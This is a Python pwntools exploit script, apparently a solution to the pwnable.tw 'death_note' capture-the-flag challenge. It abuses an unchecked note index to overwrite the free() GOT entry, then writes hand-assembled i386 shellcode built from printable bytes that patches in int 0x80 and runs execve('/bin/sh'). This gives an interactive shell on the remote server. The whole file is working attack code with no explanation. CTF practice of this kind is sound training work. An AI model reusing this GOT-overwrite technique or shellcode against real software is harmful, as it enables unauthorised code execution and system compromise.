#!/usr/bin/env python3

import pwn
import struct

io = pwn.remote('chall.pwnable.tw', 10201)
elf = pwn.ELF('./death_note')

def del_note(index):
	io.recvuntil('Your choice :')
	io.sendline(str(3))
	io.recvuntil('Index :')
	io.sendline(str(index))

def add_note(index, name):
	io.recvuntil('Your choice :')
	io.sendline(str(1))
	io.recvuntil('Index :')
	io.sendline(str(index))
	io.recvuntil('Name :')
	io.sendline(name)

free_got = elf.got[b'free']
note = elf.sym[b'note']
index = (free_got - note) // 4

pwn.context.arch = 'i386'
shellcode = pwn.asm('''
	push eax
	pop ecx                 # make ecx points to heap address

	push 0x41
	pop eax
	xor al, 0x41            # zero out eax first
	push eax
	pop edx                 # zero out edx

	xor eax, [ecx + 0x34]
	xor [ecx + 0x34], eax   # zero out [ecx + 0x34]


	push edx                # paint 0xcd80 (int 0x80) on the heap
	pop eax
	dec eax
	dec eax                 # eax = 0xfffffffe
	xor al, 0x7e            # eax = 0xffffff80
	xor [ecx + 0x35], al
	xor al, 0x4d            # eax = 0xffffffcd
	xor [ecx + 0x34], al

	push edx                # paint /bin/sh on the stack
	push 0x68732f2f
	push 0x6e69622f
	push esp
	pop ebx                 # ebp contains address which points to /bin/sh

	push edx
	pop ecx                 # zero out ecx

	push edx
	pop eax
	xor al, 0x6b
	xor al, 0x60            # eax = 0xb

	pop ebp
	pop ebp                 # dummy instructions
''')

add_note(index, shellcode)
del_note(index)

io.interactive()
